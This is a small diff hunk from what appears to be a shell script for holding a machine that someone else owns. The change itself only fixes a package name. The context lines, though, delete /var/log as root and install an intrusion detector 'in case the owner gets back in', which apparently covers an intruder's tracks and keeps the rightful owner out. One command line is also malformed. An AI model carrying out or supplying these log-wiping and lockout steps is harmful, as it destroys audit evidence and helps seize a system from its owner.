@@ -43,7 +43,7 @@ su -l -c "rm -rf /var/log && rm -rf /var/logs"
 
 # Installs the AIDE intrusion detection system in case the owner gets back in.
 
-su -l -c "urpmi AIDE && aideinit"
+su -l -c "urpmi aide && aideinit"
 
 su - l - c "cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db"
  
